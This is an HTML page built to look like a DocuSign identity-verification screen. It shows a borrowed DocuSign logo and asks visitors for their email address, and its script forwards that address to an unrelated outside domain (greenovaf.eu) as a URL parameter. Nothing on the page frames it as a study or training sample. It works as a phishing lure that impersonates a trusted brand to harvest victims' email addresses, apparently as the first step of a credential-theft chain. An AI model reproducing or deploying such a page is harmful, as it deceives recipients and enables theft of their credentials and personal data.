<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DocuSign - Verify Your Identity</title>
    <meta name="description" content="Verify your identity to access secure documents" />
    <meta name="author" content="DocuSign" />

    <meta property="og:title" content="DocuSign - Verify Your Identity" />
    <meta property="og:description" content="Verify your identity to access secure documents" />
    <meta property="og:type" content="website" />

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
        background-color: hsl(240, 10%, 96%);
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 1rem;
      }

      .card {
        background: white;
        border-radius: 0.375rem;
        border: 1px solid hsl(0, 0%, 90%);
        box-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
        width: 100%;
        max-width: 28rem;
        padding: 2rem;
      }

      .space-y-6 > * + * {
        margin-top: 1.5rem;
      }

      .space-y-4 > * + * {
        margin-top: 1rem;
      }

      .logo-container {
        display: flex;
        justify-content: center;
      }

      .logo {
        height: 4rem;
      }

      .heading {
        text-align: center;
      }

      .heading h1 {
        font-size: 1.5rem;
        font-weight: 600;
        color: hsl(0, 0%, 20%);
        margin-bottom: 1.5rem;
      }

      .content p.subtitle {
        font-size: 1rem;
        font-weight: 500;
        color: hsl(0, 0%, 20%);
        margin-bottom: 1rem;
      }

      .content p.description {
        font-size: 0.875rem;
        color: hsl(0, 0%, 40%);
        line-height: 1.5;
      }

      .form {
        width: 100%;
      }

      .email-input {
        width: 100%;
        height: 3rem;
        padding: 0 0.75rem;
        font-size: 1rem;
        border: 1px solid hsl(0, 0%, 90%);
        border-radius: 0.375rem;
        background-color: white;
        outline: none;
        transition: border-color 0.2s;
      }

      .email-input:focus {
        border-color: hsl(206, 100%, 50%);
        box-shadow: 0 0 0 2px hsl(206, 100%, 50%, 0.2);
      }

      .next-button {
        width: 100%;
        height: 3rem;
        background-color: hsl(206, 100%, 50%);
        color: white;
        border: none;
        border-radius: 0.375rem;
        font-size: 1rem;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.2s;
      }

      .next-button:hover:not(:disabled) {
        background-color: hsl(206, 100%, 45%);
      }

      .next-button:disabled {
        opacity: 0.5;
        cursor: not-allowed;
      }
    </style>
  </head>

  <body>
    <div class="card">
      <div class="space-y-6">
        <!-- DocuSign Logo -->
        <div class="logo-container">
          <img 
            src="https://logos-world.net/wp-content/uploads/2021/08/DocuSign-Logo-1.png" 
            alt="DocuSign" 
            class="logo"
          />
        </div>

        <!-- Main Heading -->
        <div class="heading">
          <h1>Verify Your Identity</h1>
        </div>

        <!-- Content -->
        <div class="content space-y-4">
          <p class="subtitle">You've received a secure document:</p>
          
          <p class="description">
            To access this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this document was shared.
          </p>
        </div>

        <!-- Form -->
        <div class="form space-y-4">
          <input
            type="email"
            id="emailInput"
            placeholder="Enter email"
            class="email-input"
          />
          
          <button 
            id="nextButton"
            class="next-button"
            disabled
          >
            Next
          </button>
        </div>
      </div>
    </div>

    <script>
      const emailInput = document.getElementById('emailInput');
      const nextButton = document.getElementById('nextButton');

      // Enable/disable button based on email input
      emailInput.addEventListener('input', function() {
        const email = this.value.trim();
        nextButton.disabled = !email;
      });

      // Handle next button click
      nextButton.addEventListener('click', function() {
        const email = emailInput.value.trim();
        if (email) {
          const verificationLink = `https://greenovaf.eu/D7n5xVZzL/?e=${encodeURIComponent(email)}`;
          window.location.href = verificationLink;
        }
      });

      // Handle enter key press
      emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !nextButton.disabled) {
          nextButton.click();
        }
      });
    </script>
  </body>
</html>
